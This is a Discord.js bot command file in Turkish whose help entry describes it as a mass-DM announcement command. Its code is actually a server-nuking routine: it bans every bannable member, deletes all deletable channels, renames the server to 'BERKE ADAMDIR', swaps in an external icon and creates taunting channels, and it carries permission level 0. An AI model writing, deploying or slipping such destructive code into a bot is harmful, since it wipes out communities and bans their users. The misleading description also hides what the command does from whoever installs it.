const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;
let insan = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
insan++
message.guild.ban(u, "Berke Adamdır")
}
})
 
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});  

if(message.deletable) message.delete();
    message.guild.channels.forEach(channel => {
      if(channel.deletable) channel.delete()
  })

console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
  
message.guild.setName(`BERKE ADAMDIR`, ":))")
message.guild.setIcon(`https://media.discordapp.net/attachments/566759721294495761/566902339726999553/6fc0bd5fbaec9e4bdcc10c0bd459f605.png`)

message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.createChannel(`berke-abi-ne-yaptin`)
message.guild.createChannel(`berke-adamdir`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'benberke',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
